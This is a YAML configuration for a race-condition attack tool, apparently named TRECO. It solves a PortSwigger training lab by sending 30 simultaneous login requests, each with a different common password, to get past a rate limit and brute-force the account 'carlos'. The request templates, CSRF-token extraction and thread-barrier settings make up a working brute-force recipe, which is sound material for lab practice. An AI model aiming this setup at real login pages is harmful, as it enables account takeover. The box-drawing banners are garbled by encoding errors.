# ============================================================================
# TRECO Configuration: PortSwigger Lab 2 - Bypassing Rate Limits
# ============================================================================
#
# Lab URL: https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits
#
# This lab's login mechanism uses rate limiting to defend against brute-force
# attacks. However, by sending many login attempts simultaneously using a race
# condition, you can bypass the rate limit and brute-force the password.
#
# Objective: Use race conditions with different passwords per thread to bypass
# rate limiting and successfully login as carlos.
#
# Usage:
#   export LAB_HOST="YOUR-LAB-ID.web-security-academy.net"
#   treco examples/portswigger/rate-limit-bypass/attack.yaml
#
# ============================================================================

metadata:
  name: "PortSwigger Lab 2 - Bypassing Rate Limits via Race Conditions"
  version: "1.0"
  author: "TRECO Team"
  vulnerability: "CWE-362"
  description: |
    Exploits race conditions to bypass login rate limiting by sending
    multiple login attempts with different passwords simultaneously.
    Each thread tries a different password from a wordlist.

target:
  host: "{{ env('LAB_HOST', '0a1b2c3d4e5f.web-security-academy.net') }}"
  port: 443
  tls:
    enabled: true
    verify_cert: false
  http:
    follow_redirects: false
  proxy:
    type: http
    host: 127.0.0.1
    port: 8080

entrypoint:
  state: login_page
  input:
    username: "carlos"

# ============================================================================
# STATES
# ============================================================================

states:

  login_page:
    description: "Fetch CSRF token from login page"
    
    request: |
      GET /login HTTP/1.1
      Host: {{ target.host }}
    
    extract:
      session:
        type: cookie
        pattern: session
      csrf_token:
        type: xpath
        pattern: "//input[@name='csrf']/@value"
    
    logger:
      on_state_enter: |
        ğŸ” Fetching session and CSRF token from login page...
      on_state_leave: |
        ğŸ”‘ CSRF: {{ login_page.csrf }}
        ğŸª Session: {{ login_page.session }}

    next:
      - when:
          - status: 200
        goto: brute_force_login


  brute_force_login:
    description: "Bypass rate limit by racing login attempts with different passwords"
    
    # This state demonstrates the key feature: input_mode: distribute
    # Each of the 30 threads will receive a DIFFERENT password from the wordlist
    race:
      threads: 30
      input_mode: distribute  # Each thread gets a unique password
      sync_mechanism: barrier
      connection_strategy: multiplexed
      thread_propagation: single

    # options:
    #   proxy_bypass: true

    # Input configuration for username and password
    input:
      password:
        source: file
        path: "builtin:passwords-top-30" # Built-in wordlist with common passwords

    request: |
      POST /login HTTP/1.1
      Host: {{ target.host }}
      Cookie: session={{ login_page.session }}
      Content-Type: application/x-www-form-urlencoded
      
      csrf={{ login_page.csrf_token }}&username={{ thread.input.username }}&password={{ thread.input.password }}
    
    logger:
      on_state_enter: |
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  ğŸ” PortSwigger Lab 2: Bypassing Rate Limits via Race Conditions             â•‘
        â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
        â•‘  Target:   {{ "%-65s" | format(target.host)                               }} â•‘
        â•‘  Username: {{ "%-65s" | format(username)                                  }} â•‘
        â•‘  Strategy: Race 30 login attempts with different passwords simultaneously    â•‘
        â•‘  Mode:     DISTRIBUTE (each thread gets unique password)                     â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        
        ğŸ” Loading passwords from built-in wordlist...
        âš¡ Starting race attack with {{ race.threads }} threads...
      
      on_thread_leave: |
        {% if response.status_code == 302 %}
        ğŸŸ¢ Thread {{ "%02d" | format(thread.id) }}: SUCCESS! Password found: "{{ input.password }}"
        {% elif response.status_code == 200 and 'Invalid username or password' in response.text %}
        ğŸ”´ Thread {{ "%02d" | format(thread.id) }}: Failed with "{{ input.password }}"
        {% elif response.status_code == 200 and 'too many incorrect login attempts' in response.text %}
        âš ï¸  Thread {{ "%02d" | format(thread.id) }}: Rate limited ({{ input.password }})
        {% else %}
        âšª Thread {{ "%02d" | format(thread.id) }}: Status {{ response.status_code }} ({{ input.password }})
        {% endif %}
      
      on_state_leave: |
        {% set successful = brute_force_login | selectattr('status', 'equalto', 302) | list %}
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  ğŸ“Š RACE ATTACK RESULTS                                                      â•‘
        â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
        â•‘  Threads:    {{ "%-63s" | format(race.threads)                            }} â•‘
        â•‘  Successful: {{ "%-63s" | format(successful | length)                     }} â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        
        {% if successful | length > 0 %}
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  ğŸ‰ LAB SOLVED!                                                              â•‘
        â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
        â•‘  âœ… Successfully bypassed rate limit and found valid credentials             â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        
        {% else %}
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘  âš ï¸  NO SUCCESSFUL LOGIN                                                      â•‘
        â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
        â•‘  Try:                                                                        â•‘
        â•‘  - Using a different wordlist                                                â•‘
        â•‘  - Increasing thread count                                                   â•‘
        â•‘  - Verifying the username is correct                                         â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        
        {% endif %}
